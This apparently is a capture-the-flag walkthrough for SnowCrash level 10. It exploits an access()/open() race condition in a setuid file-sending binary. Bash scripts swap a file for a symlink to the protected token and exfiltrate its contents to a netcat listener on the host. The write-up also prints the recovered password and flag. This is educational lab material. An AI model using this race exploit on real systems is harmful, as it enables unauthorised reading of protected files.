## level 10

Starting out level 10 we see the file structure:

```bash
level10@SnowCrash:~$ ls -la
total 28
drwxrwxrwx+ 1 level10 level10   140 Jun 11 14:03 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

Another `levelX` executable and `token` file!
Attempting to run the `level10` executable we can see the arguments it expects:

```bash
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
```

Okay it expects a file and a location to send it to, lets try sending the `token` file to the localhost:

```bash
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```

Hmmm it appears we wont be able to read out the contents of the `token` file that easily.
For now, lets just try to send another file to get a bit more information on the `level10` executable:

```bash
level10@SnowCrash:~$ echo 'Hello world' > send_file
level10@SnowCrash:~$ ./level10 send_file localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```

Thats some extra information! It wants to connect to the port `6969`.
Lets port-forward this port from our VM to our host system and run it again, whilst listening to the port using `nc`.

```bash
# On the VM:
level10@SnowCrash:~$ ./level10 send_file 10.0.2.2
Connecting to 10.0.2.2:6969 .. Connected!
Sending file .. wrote file!
```

Notice how the IP `10.0.2.2` is used, this is the IP used by virtual box so it might differ depending on your VM software.

```bash
# On the host:
➜  ~ nc -l -p 6969
.*( )*.
Hello world
```

Great we're able to get the contents of our `send_file` to our host, there is also an added banner: `.*( )*.`.
Now all that there is left to do is try to find a way to get access to our `token` file.

## Solution

After doing a bit more testing we were able to see a couple of extra error messages that the `level10` binary could produce:

```
Damn. Unable to open file
Unable to read from file: test_file
You don't have access to test_file
```

This output combined with the fact that we can see that the `access` function is used could mean that this binary is vulnerable to a race condition!
It is possible that within the time spend between the call to `access` and `open` that the given file is removed, and a symlink is created to a sensitive file.

To try and get this to happen we can brute force the calls to `token10` within a script, until we get our desired output:

```bash
#!/bin/bash

for i in {1..200}; do
  touch symlink &
  ./level10 symlink 10.0.2.2 &
  ln -s token symlink &
  rm -rf symlink &
done
```

And on our host side we keep opening new connections until we see the token appear:

```bash
#!/bin/bash

while true; do
	nc -l -p 6969 | grep -v ".*( )*." > token
	[ -s token ] && break
done

cat token
rm -rf token
```

Running the both commands and ignoring all the output on the VM side we can see the token appear on the host side:

```bash
./token-grabber.sh        
woupa2yuojeeaaed06riuj63c
```

After achieving the token its time to log into the `flag10` user and grab our flag!

```bash
level10@SnowCrash:~$ su - flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
